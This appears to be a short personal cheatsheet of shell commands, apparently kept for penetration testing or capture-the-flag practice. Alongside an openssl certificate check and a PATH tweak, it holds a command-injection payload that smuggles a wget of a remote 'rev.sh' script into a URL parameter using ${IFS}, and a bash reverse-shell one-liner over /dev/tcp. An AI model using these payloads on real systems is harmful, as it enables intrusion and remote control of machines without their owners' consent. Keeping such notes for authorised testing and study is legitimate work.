# LifeLongCommands
All command needed to be noted

# Certificate Check
openssl s_client -showcerts -connect $ip:$port

# Binary Execution Path changing 
```bash
export PATH=/home/somedirectory:$PATH
```
# Command injection
yt_url=;wget${IFS}http://10.4.39.84:8000/rev.sh;

# Reverse Shell cheatsheet
bash -i >& /dev/tcp/$myip/9999 0>&1
